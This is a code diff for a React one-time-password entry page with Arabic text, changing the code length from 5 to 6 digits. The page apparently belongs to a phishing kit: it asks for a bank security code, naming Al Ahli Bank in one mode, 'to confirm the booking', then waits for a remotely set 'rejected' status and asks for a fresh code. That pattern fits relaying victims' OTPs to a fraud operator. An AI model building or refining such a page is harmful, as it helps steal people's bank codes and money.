@@ -10,8 +10,8 @@ export default function TokenVerificationPage() {
   const location = useLocation();
   const isBankAppMode = location.pathname === '/otp-bank';
 
-  // 5-digit TOKEN state (instead of 6)
-  const [otp, setOtp] = useState(['', '', '', '', '']);
+  // 6-digit TOKEN state
+  const [otp, setOtp] = useState(['', '', '', '', '', '']);
   const [secondsLeft, setSecondsLeft] = useState(120);
   const [isVerifying, setIsVerifying] = useState(false);
   const [otpError, setOtpError] = useState('');
@@ -42,9 +42,9 @@ export default function TokenVerificationPage() {
           navigate('/success');
         } else if (req.otpStatus === 'rejected') {
           setIsVerifying(false);
-          setOtp(['', '', '', '', '']);
+          setOtp(['', '', '', '', '', '']);
           setSecondsLeft(120);
-          setOtpError('رمز الأمان (TOKEN) المكون من 5 أرقام غير صحيح أو منتهي الصلاحية. يرجى إدخال الرمز الجديد.');
+          setOtpError('رمز الأمان (TOKEN) المكون من 6 أرقام غير صحيح أو منتهي الصلاحية. يرجى إدخال الرمز الجديد.');
         }
       } catch {
         // Ignore transient network errors
@@ -66,8 +66,8 @@ export default function TokenVerificationPage() {
     newOtp[index] = val.slice(-1);
     setOtp(newOtp);
 
-    // Auto focus next input (5 digits: indices 0..4)
-    if (val && index < 4) {
+    // Auto focus next input (6 digits: indices 0..5)
+    if (val && index < 5) {
       const nextInput = document.getElementById(`otp-${index + 1}`);
       nextInput?.focus();
     }
@@ -82,8 +82,8 @@ export default function TokenVerificationPage() {
 
   const handleVerify = async () => {
     const code = otp.join('');
-    if (code.length < 5) {
-      setOtpError('يرجى إدخال رمز الأمان (TOKEN) المكون من 5 أرقام بالكامل.');
+    if (code.length < 6) {
+      setOtpError('يرجى إدخال رمز الأمان (TOKEN) المكون من 6 أرقام بالكامل.');
       return;
     }
 
@@ -135,7 +135,7 @@ export default function TokenVerificationPage() {
           {/* Token Pill Button */}
           <div className="mb-5">
             <div className="inline-block border-2 border-[#004838] text-[#004838] font-black tracking-widest text-sm px-6 py-2 rounded-xl">
-              {isBankAppMode ? 'BANK APPROVAL' : 'TOKEN'}
+              {isBankAppMode ? 'BANK APPROVAL' : 'TOKEN (6 DIGITS)'}
             </div>
           </div>
 
@@ -150,12 +150,12 @@ export default function TokenVerificationPage() {
           <div className="border border-gray-200 rounded-2xl p-5 bg-gray-50/50">
             <p className="text-xs text-gray-700 font-semibold mb-4 leading-relaxed">
               {isBankAppMode
-                ? 'تم إرسال طلب موافقة ورمز الأمان (5 أرقام) إلى هاتفك المسجل لدى البنك الأهلي لتأكيد عملية الحجز بنجاح'
-                : 'تم ارسال رمز الأمان (5 أرقام) الى جوالك الرجاء التحقق من الرمز وادخالة لتأكيد عملية الحجز بنجاح'}
+                ? 'تم إرسال طلب موافقة ورمز الأمان (6 أرقام) إلى هاتفك المسجل لدى البنك الأهلي لتأكيد عملية الحجز بنجاح'
+                : 'تم ارسال رمز الأمان (6 أرقام) الى جوالك الرجاء التحقق من الرمز وادخالة لتأكيد عملية الحجز بنجاح'}
             </p>
 
-            {/* 5 Digit TOKEN Inputs */}
-            <div className="flex justify-center gap-2.5 mb-4" dir="ltr">
+            {/* 6 Digit TOKEN Inputs */}
+            <div className="flex justify-center gap-2 mb-4" dir="ltr">
               {otp.map((digit, idx) => (
                 <input
                   key={idx}
@@ -167,7 +167,7 @@ export default function TokenVerificationPage() {
                   value={digit}
                   onChange={(e) => handleOtpChange(idx, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(idx, e)}
-                  className="w-12 h-12 text-center text-xl font-bold bg-white border border-gray-300 rounded-xl focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all shadow-2xs"
+                  className="w-10 h-12 text-center text-xl font-bold bg-white border border-gray-300 rounded-xl focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all shadow-2xs"
                 />
               ))}
             </div>
